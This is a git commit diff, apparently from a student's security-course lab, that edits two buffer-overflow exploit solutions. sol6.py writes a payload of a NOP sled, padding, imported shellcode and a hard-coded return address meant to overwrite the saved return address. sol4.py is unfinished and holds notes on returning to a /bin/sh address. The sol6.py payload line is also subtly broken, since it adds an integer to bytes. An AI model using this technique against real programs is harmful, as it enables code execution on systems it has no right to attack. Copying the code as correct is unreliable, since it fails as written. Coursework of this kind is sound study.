bf98ed789155b701f56408f7fcb237543c75f223
Libby Cox <libbycox@umich.edu>
2025-04-02 14:40:16 +0000

    Automatic commit by test script for libbycox

--- sol4.py
+++ sol4.py
@@ -4,4 +4,6 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write()
+sys.stdout.buffer.write(b'A')
+# cannot find the .binsh addr from shellcode
+# need padding, something to overwrite the return address, then the ./binsh address (as the argument)
--- sol6.py
+++ sol6.py
@@ -3,3 +3,8 @@
 import sys
 
 from shellcode import shellcode
+
+sys.stdout.buffer.write(0x90 + (0x70-56)*b'A'+shellcode+(8*b'A')+(2+0x7ffffff6d4e8).to_bytes(8,"little"))
+# adding a big NOP sled before the shellcode so the return address doesn’t have to be super precise
+# can no longer write the return address into it bc we don't know the exact offset
+# aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
